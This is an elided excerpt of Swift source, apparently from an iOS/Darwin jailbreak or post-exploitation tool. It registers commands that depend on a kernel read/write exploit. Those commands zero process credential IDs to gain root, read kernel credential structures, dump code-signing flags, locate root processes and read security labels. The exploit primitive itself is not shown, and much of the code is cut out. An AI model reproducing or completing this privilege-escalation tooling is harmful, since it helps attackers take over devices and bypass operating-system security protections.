...
private func _regCredentials() {
    ...
    OmegaCore.register("set-all-ids-zero") { _, mgr in
        ...
        return _result(tc_set_all_ids_zero())
    }

    OmegaCore.register("ucred-reader") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ucred-reader: exploit not ready") }
        guard !ds_socket_broken() else { return .fail("ucred-reader: kernel r/w socket broken — restart exploit") }
...
private func _regCSFlags() {
    ...
    OmegaCore.register("cs-flags-dump") { rawArg, mgr in
        ...
        guard !ds_socket_broken() else { return .fail("cs-flags-dump: kernel r/w socket broken — restart exploit") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        let pid: pid_t = arg.isEmpty ? getpid() : _pidArg(arg)
...
private func _regProcPriv() {
    ...
    OmegaCore.register("proc-uid-inspector") { rawArg, mgr in
        ...
        guard !ds_socket_broken() else { return .fail("proc-uid-inspector: kernel r/w socket broken — restart exploit") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
        let pid: pid_t = arg.isEmpty ? getpid() : _pidArg(arg)
    ...
    OmegaCore.register("find-root-process") { _, mgr in
        ...
        guard !ds_socket_broken() else { return .fail("find-root-process: kernel r/w socket broken — restart exploit") }
        var kaddr: UInt64 = 0
        var pid: pid_t = 0
...
private func _regSecurityLabels() {
    ...
    OmegaCore.register("security-label-read") { rawArg, mgr in
        ...
        guard !ds_socket_broken() else { return .fail("security-label-read: kernel r/w socket broken — restart exploit") }
        let arg = rawArg.trimmingCharacters(in: .whitespaces)
